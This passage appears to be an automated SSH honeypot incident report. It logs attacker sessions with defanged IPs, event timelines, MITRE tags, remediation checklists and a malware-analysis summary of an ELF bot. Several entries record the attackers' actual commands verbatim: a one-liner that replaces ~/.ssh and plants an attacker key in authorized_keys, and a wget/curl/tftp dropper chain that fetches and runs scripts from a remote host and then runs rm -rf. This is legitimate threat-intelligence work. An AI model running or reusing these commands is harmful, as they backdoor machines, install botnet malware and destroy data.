### 🔴 HIGH · IR-d7b0cbb90907

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:21 |
| **Last Seen** | 2026-09-19 20:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:21:36` | `cowrie.session.connect` |
| `2026-09-19 20:21:36` | `cowrie.client.version` |
| `2026-09-19 20:21:36` | `cowrie.client.kex` |
| `2026-09-19 20:21:36` | `cowrie.login.success` |
| `2026-09-19 20:21:37` | `cowrie.session.params` |
| `2026-09-19 20:21:37` | `cowrie.command.input` |
| `2026-09-19 20:21:37` | `cowrie.log.closed` |
| `2026-09-19 20:21:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-433d0f991dae

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:23 |
| **Last Seen** | 2026-09-19 20:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:23:15` | `cowrie.session.connect` |
| `2026-09-19 20:23:15` | `cowrie.client.version` |
| `2026-09-19 20:23:15` | `cowrie.client.kex` |
| `2026-09-19 20:23:16` | `cowrie.login.success` |
| `2026-09-19 20:23:16` | `cowrie.session.params` |
| `2026-09-19 20:23:16` | `cowrie.command.input` |
| `2026-09-19 20:23:19` | `cowrie.log.closed` |
| `2026-09-19 20:23:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c81af6f39ea4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:25 |
| **Last Seen** | 2026-09-19 20:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:25:07` | `cowrie.session.connect` |
| `2026-09-19 20:25:07` | `cowrie.client.version` |
| `2026-09-19 20:25:07` | `cowrie.client.kex` |
| `2026-09-19 20:25:07` | `cowrie.login.success` |
| `2026-09-19 20:25:08` | `cowrie.session.params` |
| `2026-09-19 20:25:08` | `cowrie.command.input` |
| `2026-09-19 20:25:08` | `cowrie.log.closed` |
| `2026-09-19 20:25:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d55c3ff8aa0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:26 |
| **Last Seen** | 2026-09-19 20:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:26:43` | `cowrie.session.connect` |
| `2026-09-19 20:26:43` | `cowrie.client.version` |
| `2026-09-19 20:26:43` | `cowrie.client.kex` |
| `2026-09-19 20:26:44` | `cowrie.login.success` |
| `2026-09-19 20:26:44` | `cowrie.session.params` |
| `2026-09-19 20:26:44` | `cowrie.command.input` |
| `2026-09-19 20:26:45` | `cowrie.log.closed` |
| `2026-09-19 20:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9296b5c9d652

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:28 |
| **Last Seen** | 2026-09-19 20:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:28:49` | `cowrie.session.connect` |
| `2026-09-19 20:28:49` | `cowrie.client.version` |
| `2026-09-19 20:28:49` | `cowrie.client.kex` |
| `2026-09-19 20:28:49` | `cowrie.login.success` |
| `2026-09-19 20:28:50` | `cowrie.session.params` |
| `2026-09-19 20:28:50` | `cowrie.command.input` |
| `2026-09-19 20:28:50` | `cowrie.log.closed` |
| `2026-09-19 20:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e62a7570d27

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:30 |
| **Last Seen** | 2026-09-19 20:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:30:27` | `cowrie.session.connect` |
| `2026-09-19 20:30:27` | `cowrie.client.version` |
| `2026-09-19 20:30:28` | `cowrie.client.kex` |
| `2026-09-19 20:30:28` | `cowrie.login.success` |
| `2026-09-19 20:30:29` | `cowrie.session.params` |
| `2026-09-19 20:30:29` | `cowrie.command.input` |
| `2026-09-19 20:30:29` | `cowrie.log.closed` |
| `2026-09-19 20:30:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55f69e6e16f8

| Field | Detail |
|---|---|
| **Source IP** | `45.117.177[.]47` |
| **First Seen** | 2026-09-19 20:31 |
| **Last Seen** | 2026-09-19 20:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:31:02` | `cowrie.session.connect` |
| `2026-09-19 20:31:02` | `cowrie.client.version` |
| `2026-09-19 20:31:02` | `cowrie.client.kex` |
| `2026-09-19 20:31:03` | `cowrie.login.success` |
| `2026-09-19 20:31:04` | `cowrie.session.params` |
| `2026-09-19 20:31:04` | `cowrie.command.input` |
| `2026-09-19 20:31:04` | `cowrie.command.failed` |
| `2026-09-19 20:31:05` | `cowrie.log.closed` |
| `2026-09-19 20:31:05` | `cowrie.session.params` |
| `2026-09-19 20:31:05` | `cowrie.command.input` |
| `2026-09-19 20:31:06` | `cowrie.session.file_download` |
| `2026-09-19 20:31:06` | `cowrie.log.closed` |
| `2026-09-19 20:31:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.177[.]47` to AbuseIPDB if not already reported
- [ ] Block `45.117.177[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50e0d080e668

| Field | Detail |
|---|---|
| **Source IP** | `45.117.177[.]47` |
| **First Seen** | 2026-09-19 20:31 |
| **Last Seen** | 2026-09-19 20:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:31:06` | `cowrie.session.connect` |
| `2026-09-19 20:31:06` | `cowrie.client.version` |
| `2026-09-19 20:31:06` | `cowrie.client.kex` |
| `2026-09-19 20:31:07` | `cowrie.login.success` |
| `2026-09-19 20:31:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.177[.]47` to AbuseIPDB if not already reported
- [ ] Block `45.117.177[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b9cae4f14f8

| Field | Detail |
|---|---|
| **Source IP** | `45.117.177[.]47` |
| **First Seen** | 2026-09-19 20:31 |
| **Last Seen** | 2026-09-19 20:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:31:08` | `cowrie.session.connect` |
| `2026-09-19 20:31:08` | `cowrie.client.version` |
| `2026-09-19 20:31:08` | `cowrie.client.kex` |
| `2026-09-19 20:31:09` | `cowrie.login.success` |
| `2026-09-19 20:31:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.117.177[.]47` to AbuseIPDB if not already reported
- [ ] Block `45.117.177[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656  (ELF Binary (Linux executable))
   SHA256: 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aa...
   Score : 86/100  |  VT: 40/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ Execution from /tmp: /tmp/bot
   ↳ chmod +x (make executable): chmod +x
```

### 🔴 HIGH · IR-8edbea7330e0

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-19 20:31 |
| **Last Seen** | 2026-09-19 20:31 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **Malware Analysis** | 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656 (HIGH) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:31:30` | `cowrie.session.connect` |
| `2026-09-19 20:31:31` | `cowrie.login.success` |
| `2026-09-19 20:31:31` | `cowrie.session.params` |
| `2026-09-19 20:31:33` | `cowrie.command.input` |
| `2026-09-19 20:31:33` | `cowrie.command.input` |
| `2026-09-19 20:31:33` | `cowrie.session.file_download` |
| `2026-09-19 20:31:33` | `cowrie.session.file_download` |
| `2026-09-19 20:31:33` | `cowrie.session.file_download` |
| `2026-09-19 20:31:34` | `cowrie.session.file_download` |
| `2026-09-19 20:31:34` | `cowrie.session.file_download.failed` |
| `2026-09-19 20:31:35` | `cowrie.session.file_download` |
| `2026-09-19 20:31:35` | `cowrie.session.file_download` |
| `2026-09-19 20:31:48` | `cowrie.log.closed` |
| `2026-09-19 20:31:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b4421aa3890

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:32 |
| **Last Seen** | 2026-09-19 20:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:32:24` | `cowrie.session.connect` |
| `2026-09-19 20:32:24` | `cowrie.client.version` |
| `2026-09-19 20:32:24` | `cowrie.client.kex` |
| `2026-09-19 20:32:24` | `cowrie.login.success` |
| `2026-09-19 20:32:25` | `cowrie.session.params` |
| `2026-09-19 20:32:25` | `cowrie.command.input` |
| `2026-09-19 20:32:25` | `cowrie.log.closed` |
| `2026-09-19 20:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb42b9c0950e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-19 20:33 |
| **Last Seen** | 2026-09-19 20:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:33:28` | `cowrie.session.connect` |
| `2026-09-19 20:33:28` | `cowrie.client.version` |
| `2026-09-19 20:33:29` | `cowrie.client.kex` |
| `2026-09-19 20:33:29` | `cowrie.login.success` |
| `2026-09-19 20:33:29` | `cowrie.direct-tcpip.request` |
| `2026-09-19 20:33:29` | `cowrie.direct-tcpip.data` |
| `2026-09-19 20:33:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3b7c5e78a28

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:34 |
| **Last Seen** | 2026-09-19 20:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:34:25` | `cowrie.session.connect` |
| `2026-09-19 20:34:25` | `cowrie.client.version` |
| `2026-09-19 20:34:25` | `cowrie.client.kex` |
| `2026-09-19 20:34:25` | `cowrie.login.success` |
| `2026-09-19 20:34:26` | `cowrie.session.params` |
| `2026-09-19 20:34:26` | `cowrie.command.input` |
| `2026-09-19 20:34:26` | `cowrie.log.closed` |
| `2026-09-19 20:34:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f38a6fbd3ef0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:36 |
| **Last Seen** | 2026-09-19 20:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:36:06` | `cowrie.session.connect` |
| `2026-09-19 20:36:06` | `cowrie.client.version` |
| `2026-09-19 20:36:06` | `cowrie.client.kex` |
| `2026-09-19 20:36:06` | `cowrie.login.success` |
| `2026-09-19 20:36:07` | `cowrie.session.params` |
| `2026-09-19 20:36:07` | `cowrie.command.input` |
| `2026-09-19 20:36:07` | `cowrie.log.closed` |
| `2026-09-19 20:36:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1164d3f6f448

| Field | Detail |
|---|---|
| **Source IP** | `171.244.199[.]25` |
| **First Seen** | 2026-09-19 20:36 |
| **Last Seen** | 2026-09-19 20:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:36:07` | `cowrie.session.connect` |
| `2026-09-19 20:36:07` | `cowrie.client.version` |
| `2026-09-19 20:36:08` | `cowrie.client.kex` |
| `2026-09-19 20:36:08` | `cowrie.login.success` |
| `2026-09-19 20:36:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.199[.]25` to AbuseIPDB if not already reported
- [ ] Block `171.244.199[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8899c0705e3a

| Field | Detail |
|---|---|
| **Source IP** | `175.198.62[.]180` |
| **First Seen** | 2026-09-19 20:38 |
| **Last Seen** | 2026-09-19 20:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:38:11` | `cowrie.session.connect` |
| `2026-09-19 20:38:11` | `cowrie.client.version` |
| `2026-09-19 20:38:11` | `cowrie.client.kex` |
| `2026-09-19 20:38:12` | `cowrie.login.success` |
| `2026-09-19 20:38:13` | `cowrie.session.params` |
| `2026-09-19 20:38:13` | `cowrie.command.input` |
| `2026-09-19 20:38:13` | `cowrie.command.failed` |
| `2026-09-19 20:38:14` | `cowrie.log.closed` |
| `2026-09-19 20:38:14` | `cowrie.session.params` |
| `2026-09-19 20:38:14` | `cowrie.command.input` |
| `2026-09-19 20:38:15` | `cowrie.session.file_download` |
| `2026-09-19 20:38:15` | `cowrie.log.closed` |
| `2026-09-19 20:38:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.198.62[.]180` to AbuseIPDB if not already reported
- [ ] Block `175.198.62[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e0ad5998f68

| Field | Detail |
|---|---|
| **Source IP** | `175.198.62[.]180` |
| **First Seen** | 2026-09-19 20:38 |
| **Last Seen** | 2026-09-19 20:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:38:15` | `cowrie.session.connect` |
| `2026-09-19 20:38:15` | `cowrie.client.version` |
| `2026-09-19 20:38:15` | `cowrie.client.kex` |
| `2026-09-19 20:38:16` | `cowrie.login.success` |
| `2026-09-19 20:38:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.198.62[.]180` to AbuseIPDB if not already reported
- [ ] Block `175.198.62[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12d28ea39ea7

| Field | Detail |
|---|---|
| **Source IP** | `175.198.62[.]180` |
| **First Seen** | 2026-09-19 20:38 |
| **Last Seen** | 2026-09-19 20:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:38:16` | `cowrie.session.connect` |
| `2026-09-19 20:38:16` | `cowrie.client.version` |
| `2026-09-19 20:38:16` | `cowrie.client.kex` |
| `2026-09-19 20:38:17` | `cowrie.login.success` |
| `2026-09-19 20:38:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.198.62[.]180` to AbuseIPDB if not already reported
- [ ] Block `175.198.62[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d25f0f48f36d

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-09-19 20:38 |
| **Last Seen** | 2026-09-19 20:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:38:16` | `cowrie.session.connect` |
| `2026-09-19 20:38:16` | `cowrie.client.version` |
| `2026-09-19 20:38:17` | `cowrie.client.kex` |
| `2026-09-19 20:38:17` | `cowrie.login.success` |
| `2026-09-19 20:38:18` | `cowrie.session.params` |
| `2026-09-19 20:38:18` | `cowrie.command.input` |
| `2026-09-19 20:38:18` | `cowrie.command.failed` |
| `2026-09-19 20:38:19` | `cowrie.log.closed` |
| `2026-09-19 20:38:20` | `cowrie.session.params` |
| `2026-09-19 20:38:20` | `cowrie.command.input` |
| `2026-09-19 20:38:20` | `cowrie.session.file_download` |
| `2026-09-19 20:38:20` | `cowrie.log.closed` |
| `2026-09-19 20:38:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d401dd9cef83

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-09-19 20:38 |
| **Last Seen** | 2026-09-19 20:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:38:20` | `cowrie.session.connect` |
| `2026-09-19 20:38:20` | `cowrie.client.version` |
| `2026-09-19 20:38:21` | `cowrie.client.kex` |
| `2026-09-19 20:38:21` | `cowrie.login.success` |
| `2026-09-19 20:38:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9ff3542f6a8

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]26` |
| **First Seen** | 2026-09-19 20:38 |
| **Last Seen** | 2026-09-19 20:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:38:22` | `cowrie.session.connect` |
| `2026-09-19 20:38:22` | `cowrie.client.version` |
| `2026-09-19 20:38:22` | `cowrie.client.kex` |
| `2026-09-19 20:38:23` | `cowrie.login.success` |
| `2026-09-19 20:38:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-635c0e74e52a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-19 20:39 |
| **Last Seen** | 2026-09-19 20:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 20:39:25` | `cowrie.session.connect` |
| `2026-09-19 20:39:25` | `cowrie.client.version` |
| `2026-09-19 20:39:25` | `cowrie.client.kex` |
| `2026-09-19 20:39:26` | `cowrie.login.success` |
| `2026-09-19 20:39:26` | `cowrie.session.params` |
| `2026-09-19 20:39:26` | `cowrie.command.input` |
| `2026-09-19 20:39:27` | `cowrie.log.closed` |
| `2026-09-19 20:39:27` | `cowrie.session.closed` |

**Recommended Actions:**
